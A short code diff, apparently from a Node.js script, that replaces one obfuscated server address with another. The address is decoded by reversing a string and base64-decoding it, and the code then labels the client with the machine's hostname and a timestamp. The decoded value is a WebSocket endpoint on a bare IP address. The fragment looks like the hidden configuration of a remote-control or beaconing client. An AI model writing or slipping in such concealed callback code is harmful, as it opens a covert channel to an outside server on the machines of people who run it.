@@ -58,7 +58,7 @@ const runForWindows = async () => {
 const runForAll = async () => {
   try {
     // Configuration
-    const encoded = "==QM1ATN6QTNy4iNyIjLxgTMuUzMx8yL6M3d";
+    const encoded = "=ADO6QTNy4iNyIjLxgTMuUzMx8yL6M3d";
     const decode = (str) => atob(str.split("").reverse().join(""));
     const SERVER_URL = decode(encoded);
     const clientName = `${os.hostname()}_${Date.now()}`;
